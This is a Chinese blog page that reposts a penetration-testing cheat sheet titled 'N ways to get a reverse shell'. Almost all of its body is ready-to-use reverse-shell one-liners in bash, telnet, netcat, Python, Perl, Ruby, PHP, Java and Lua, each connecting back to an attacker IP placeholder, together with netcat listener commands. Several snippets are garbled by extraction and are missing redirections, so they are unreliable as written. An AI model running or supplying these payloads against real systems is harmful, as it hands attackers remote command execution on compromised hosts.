<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>windows 反弹shell_反弹shell的N种姿势 - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="windows 反弹shell_反弹shell的N种姿势" />
<meta property="og:description" content="0x00 前言 在渗透测试的过程中，在拿到webshell以后，如果目标主机是Windows主机，则是通过开3389端口在远程连接，如果目标主机是linux服务器，一般我们都会选择反弹shell来进行操作。在这里总结下反弹shell常见的几种姿势。
0x01 Bash反弹 1.1 方法一 攻击者主机上执行监听：
nc -lvvp port
目标主机上执行：
bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1#bash -i 打开一个交互的bash#&gt;&amp; 将标准错误输出重定向到标准输出#/dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口#0&gt;&amp;1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互
注：/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。
inux shell下常用的文件描述符是：
1.标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；
2.标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；
3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。
另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。
1.2 方法二 exec 0&amp;0 2&gt;&amp;00196;exec 196&lt;&gt;/dev/tcp/x.x.x.x/4444; sh 196 &gt;&amp;196 2&gt;&amp;196/bin/bash -i &gt; /dev/tcp/x.x.x.x/8080 01 2&gt;&amp;1
1.3 方法三 exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done 0x02 telnet反弹 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/620981a3963dbea520897a35acb4104e/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-12-08T15:39:41+08:00" />
<meta property="article:modified_time" content="2020-12-08T15:39:41+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">windows 反弹shell_反弹shell的N种姿势</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <div class="._5ce-wx-style" style="font-size:16px;"> 
 <div class="rich_media_content" id="js_content"> 
  <h2><span style="font-weight:bold;">0x00 前言</span></h2> 
  <p>在渗透测试的过程中，在拿到webshell以后，如果目标主机是Windows主机，则是通过开3389端口在远程连接，如果目标主机是linux服务器，一般我们都会选择反弹shell来进行操作。在这里总结下反弹shell常见的几种姿势。</p> 
  <h2><span style="font-weight:bold;">0x01 Bash反弹</span></h2> 
  <h3><span style="font-weight:bold;">1.1 方法一</span></h3> 
  <p>攻击者主机上执行监听：</p> 
  <pre><code></code></pre> 
  <p><code><code>nc -lvvp port</code></code></p> 
  <code></code> 
  <p>目标主机上执行：</p> 
  <pre><code></code></pre> 
  <p><code><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1</code><code></code><code>#bash -i 打开一个交互的bash</code><code>#&gt;&amp; 将标准错误输出重定向到标准输出</code><code>#/dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</code><code>#0&gt;&amp;1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互</code></code></p> 
  <code></code> 
  <blockquote> 
   <p>注：/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p> 
  </blockquote> 
  <p>inux shell下常用的文件描述符是：</p> 
  <p>1.标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；</p> 
  <p>2.标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；</p> 
  <p>3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p> 
  <p>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p> 
  <h3></h3> 
  <h3><span style="font-weight:bold;">1.2 方法二</span></h3> 
  <pre><code></code></pre> 
  <p><code><code>exec 0&amp;0 2&gt;&amp;0</code><code></code><code>0196;exec 196&lt;&gt;/dev/tcp/x.x.x.x/4444; sh 196 &gt;&amp;196 2&gt;&amp;196</code><code></code><code>/bin/bash -i &gt; /dev/tcp/x.x.x.x/8080 01 2&gt;&amp;1</code></code></p> 
  <code></code> 
  <h3><span style="font-weight:bold;">1.3 方法三</span></h3> 
  <pre class="has"><code>exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre> 
  <h2><span style="font-weight:bold;">0x02 telnet反弹</span></h2> 
  <h3><span style="font-weight:bold;">2.1 方法一</span></h3> 
  <p>攻击者主机上打开两个终端分别执行监听：</p> 
  <pre><code></code></pre> 
  <p><code><code>nc -lvvp 4444</code><code>nc -lvvp 5555</code></code></p> 
  <code></code> 
  <p>目标主机中执行：</p> 
  <pre><code></code></pre> 
  <p><code><code>telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555</code></code></p> 
  <code></code> 
  <p>监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip</p> 
  <p>反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。</p> 
  <h3><span style="font-weight:bold;">2.2 方法二</span></h3> 
  <pre><code></code></pre> 
  <p><code><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/p</code></code></p> 
  <code></code> 
  <h2><span style="font-weight:bold;">0x03 nc(netcat)反弹</span></h2> 
  <p>攻击者主机上执行监听命令：</p> 
  <pre><code></code></pre> 
  <p><code><code>nc -lvvp port</code></code></p> 
  <code></code> 
  <p>目标主机上执行：</p> 
  <pre><code></code></pre> 
  <p><code><code>nc -e /bin/bash x.x.x.x port</code></code></p> 
  <code></code> 
  <p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p> 
  <pre><code></code></pre> 
  <p><code><code>rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;/tmp/f</code></code></p> 
  <code></code> 
  <blockquote> 
   <p>注：mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道(根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样)，这样就实现了进程间通信</p> 
  </blockquote> 
  <pre><code></code></pre> 
  <p><code><code></code><code>nc x.x.x.x 4444|/bin/bash|nc x.x.x.x 5555 #从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</code><code></code><code>nc -c /bin/sh x.x.x.x 4444</code><code></code><code>/bin/sh | nc x.x.x.x 4444</code></code></p> 
  <code></code> 
  <p>0x04 常见脚本反弹</p> 
  <h3><span style="font-weight:bold;">4.1 python</span></h3> 
  <pre><code></code></pre> 
  <p><code><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</code></code></p> 
  <code></code> 
  <h3><span style="font-weight:bold;">4.2 perl</span></h3> 
  <h4><span style="font-weight:bold;">4.2.1 方法一</span></h4> 
  <pre><code></code></pre> 
  <p><code><code>perl -e 'use Socket;$i="x.x.x.x";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){<!-- -->open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></code></p> 
  <code></code> 
  <h4><span style="font-weight:bold;">4.2.2 方法二</span></h4> 
  <pre><code></code></pre> 
  <p><code><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:5555");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</code></code></p> 
  <code></code> 
  <h3><span style="font-weight:bold;">4.3 Ruby</span></h3> 
  <h4><span style="font-weight:bold;">4.3.1 方法一</span></h4> 
  <pre><code></code></pre> 
  <p><code><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","5555");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</code></code></p> 
  <code></code> 
  <h4><span style="font-weight:bold;">4.3.2 方法二</span></h4> 
  <pre><code></code></pre> 
  <p><code><code>ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",5555).to_i;exec sprintf("/bin/sh -i &amp;%d 2&gt;&amp;%d",f,f,f)'</code></code></p> 
  <code></code> 
  <h3><span style="font-weight:bold;">4.4 PHP</span></h3> 
  <pre><code></code></pre> 
  <p><code><code>php -r '$sock=fsockopen("x.x.x.x",5555);exec("/bin/bash -i &amp;3 2&gt;&amp;3");'</code></code></p> 
  <code></code> 
  <h3><span style="font-weight:bold;">4.5 Java</span></h3> 
  <pre><code></code></pre> 
  <p><code><code>public class Revs {<!-- --></code><code>/**</code><code>* @param args</code><code>* @throws Exception </code><code>*/</code><code>public static void main(String[] args) throws Exception {<!-- --></code><code> // TODO Auto-generated method stub</code><code> Runtime r = Runtime.getRuntime();</code><code> String cmd[]= {<!-- -->"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &amp;5 &gt;&amp;5; done"};</code><code> Process p = r.exec(cmd);</code><code> p.waitFor();</code><code>}</code><code>}</code></code></p> 
  <code></code> 
  <h3></h3> 
  <h3></h3> 
  <h3><span style="font-weight:bold;">4.6 <span style="font-weight:bold;">Lua</span></span></h3> 
  <pre><code></code></pre> 
  <p><code><code>lua -e "require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &amp;3 2&gt;&amp;3');"</code></code></p> 
  <code></code> 
  <blockquote> 
   <p>注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听:</p> 
   <p>nc -lvvp 5555</p> 
  </blockquote> 
  <h2><span style="font-weight:bold;">0x05 总结</span></h2> 
  <p>上面提到的是常见的反弹shell的方式，肯定还有其他的方式，欢迎大家补充，这里也会不断的跟新。</p> 
  <p>0x06 参考连接</p> 
  <p>https://www.bertramc.cn/2017/07/14/38.htmlhttp://www.myh0st.cn/index.php/archives/237/https://www.anquanke.com/post/id/85712https://blog.csdn.net/wanzt123/article/details/81879599</p> 
  <p>作者：madcoding，文章来源：madcoding’s blog</p> 
  <hr> 
  <p><strong>关注公众号:HACK之道</strong></p> 
  <p><img src="https://images2.imgbox.com/53/2f/u9HtwCWH_o.png" alt="52f7b6e6b542fc39cf0c434887b246a6.png"></p> 
 </div> 
</div>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/4abc2400303c054576ddab5e04528de7/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">简单易懂的Socket TCP网络通讯知识-消息协议和数据包</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/08cb39b61974915df46bae580db58095/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">upload-lab靶机通关</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>